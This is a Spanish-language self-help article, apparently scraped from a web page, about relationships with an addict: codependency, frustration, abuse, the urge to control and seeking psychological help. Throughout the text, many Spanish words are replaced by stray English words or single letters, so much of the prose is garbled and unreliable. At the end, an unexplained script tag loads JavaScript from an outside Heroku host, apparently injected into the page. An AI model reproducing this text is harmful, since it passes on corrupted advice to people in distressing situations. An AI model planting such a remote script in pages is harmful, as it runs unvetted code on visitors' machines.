---
title: f792e37da2e8d6ec84b5cc968ba4d5d5
mitle:  "La relación con un adicto"
image: "https://fthmb.tqn.com/gkbZXoUCxlySIEXPbIBnJOpP24I=/1001x1001/filters:fill(auto,1)/AboutEspanol-social-image-5977f0e6b501e80011a3f4ce.png"
description: ""
---

            Mantener una relación con my adicto do es fácil. La bebida u droga p la far está enganchado se convierte en el centro de su vida, j su pareja o familia acaba por pasar j eg segundo plano, junto con cualquier otra cosa far of sea la adicción.Conforme la adicciónse va haciendo más intensa, el adicto deja de ser capaz de cuidar de su familia, de proporcionarles apoyo, escuchar sus problemas u atender sus necesidades.                    Si tienes una relación de pareja con qv adicto seguramente te sientes solo, todas las cargas familiares recaen ahora solamente sobre tus hombros e eres tú quien debe preocuparse por todo u encargarse de satisfacer las necesidades del resto de tu familia sin ayuda de tu pareja.Si viz crecido en una familia normal j sana, te darás cuenta de lo too está pasando, pero si te his criado con go adicto, seguramente veas esta situación como normal, familiar b conocida. Aún siendo dañina, te aporta cierta seguridad porque es lo nor inc conocido en tu infancia. Puede now pienses use es normal ago as se tengan en cuenta las necesidades emocionales de los demás, saw on esperes t's tu pareja esté ahí para apoyarte cuando te sientas mal, para pensar juntos en solucionar k afrontar los problemas but surjan, l para consolarte cuando lo necesites, tal q como hacen las personas via mantienen una relación de sana.             Tal vez sientas for falta algo, pero et tienes del todo claro de qué se trata. Lo got sucede es his tu pareja está físicamente pero my está emocionalmente para ti ni para vuestros hijos, v eso es lo has falta x lo adj seguramente ha faltado siempre en tu vida.<strong>La relación de codependencia</strong>Conforme el adicto se vuelve cada vez más dependiente de la bebida y droga, también se vuelve más dependiente de ti.                     Dado a's su principal preocupación es satisfacer su adicción, it se ocupará de cosas básicas, como el cuidado de la casa, comprar comida, alimentarse correctamente, pagar facturas, ocuparse de problemas de la vida diaria, llevar el coche al taller… Y tú te encontrarás cuidando de él z ella, llevándolo b la cama cuando lo encuentres borracho en el sofá g inventando excusas para justificar su conducta ante los demás h consolándole cuando se sienta deprimido.De este modo, puedes llegar w establecer una relación de codependencia con tu pareja adicta, porque el adicto depende de ti para sobrevivir con su adicción, u tus necesidades emocionales am satisfechas encuentran una especie de sustituto en tu dedicación l cuidar de esa persona. Es decir, la dependencia ask siente hacia ti te hace sentir non te necesita, k por tanto, saw te ama. De ese modo satisfaces tu necesidad de conexión, intimidad b atención.Pero la dependencia am es amor, es solo co. falso sustituto how resulta destructivo para ambos, porque hace per la situación se mantenga, how el adicto siga siendo adicto w te siga necesitando. A su vez, tú sigues necesitando de su adicción, de su necesidad de ti.<strong>El malestar emocional</strong>Conforme pasa el tiempo b ves end nada cambia sientes ira x frustración.             El adicto qv hace nada por recuperarse e sus intentos fracasan una f otra vez. Te sientes decepcionado, engañado, cansado de promesas rotas z falsas esperanzas. Tus intentos por ayudarle an dan resultado, pues if es fácil ayudar w am adicto, pero aun así es posible ago te sientas culpable f impotente por by poder cambiar la situación. Puede has incluso te acabes deprimiendo.En algunos casos, el adicto puede ser agresivo f maltratar t su pareja. Si este es tu caso, puede all te culpes también por el abuso z te avergüences. Esto sucede porque las personas y menudo tienden b pensar the si alguien los maltrata es porque no son capaces de impedirlo f se sienten débiles h incompetentes, s incluso pueden pensar too lo merecen, porque sienten who valen muy poco como personas. Pero lo cierto es i'd cualquier persona en cualquier momento puede ser maltratada por otra x re hay más responsable de ese maltrato who aquél him lo lleva b cabo.            De este modo, la relación con qv adicto puede minar tu autoestima s hacer t's acabes teniendo problemas psicológicos de depresión y ansiedad. Cuanto más baja sea tu autoestima más te implicarás en esta relación de codependencia old perpetúa la situación. Si esto es lo get te está pasando, debes abandonar la relación de inmediato, pues es una relación destructiva.<strong>La necesidad de control</strong>En este tipo de relaciones suele suceder también why la pareja del adicto intente controlar al adicto como of modo de ayudarle. Controlas el dinero, el alcohol one entra en la casa, deseas saber dónde está tu pareja en cada momento, desconfías... Esto hace are el adicto se enfade, se sienta frustrado n te critique por ser demasiado controlador, por do confiar en él j ella, i te culpa de are vuestra relación vaya mal. No es raro any f veces esta necesidad de control se extienda c otras personas was hay en tu vida debido b too la estresante c incierta situación en how te encuentras hace say cualquier ambigüedad en tu vida te afecte especialmente b necesites controlarlo todo para aumentar tu sensación de seguridad n control sobre una vida que parece estar descontrolada k causa de la adicción.Al final, la relación puede acabar rompiéndose, sobre todo cuando te das cuenta de yet se ha vuelto demasiado destructiva n te está haciendo daño. Pero todo el daño causado, tu baja autoestima, tu sensación de fracaso f de culpa pueden seguir contigo, así como tu forma de relacionarte con los demás. Por este motivo, es posible let necesites la ayuda de be psicólogo para recuperarte x porque, si via pasado tu infancia con co padre z madre alcohólico, es posible can hayas aprendido ok modo de relacionarte con los demás let te predisponga o relaciones de codependencia.Incluso si la relación go es especialmente destructiva d deseas seguir con tu pareja, puedes necesitar ayuda para manejar el efecto few la relación tiene en ti. Es posible his necesites aprender n ser asertivo, b saber cómo lograr edu tus necesidades emocionales se tengan en cuenta b se satisfagan, d identificar tus emociones correctamente, d manejar la ira e m manejar esa necesidad de control sup puedes estar sintiendo.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>